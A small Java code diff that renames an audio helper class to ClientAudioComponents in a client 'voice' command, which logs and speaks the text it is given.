@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.message;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.AudioComponents;
+import br.com.introcdc.connect.client.components.ClientAudioComponents;
 
 public class ClientCommandVoice extends ClientCommand {
 
@@ -19,7 +19,7 @@ public class ClientCommandVoice extends ClientCommand {
             return;
         }
         msg("Reproduzindo texto: " + input);
-        AudioComponents.playText(input);
+        ClientAudioComponents.playText(input);
     }
 
 }
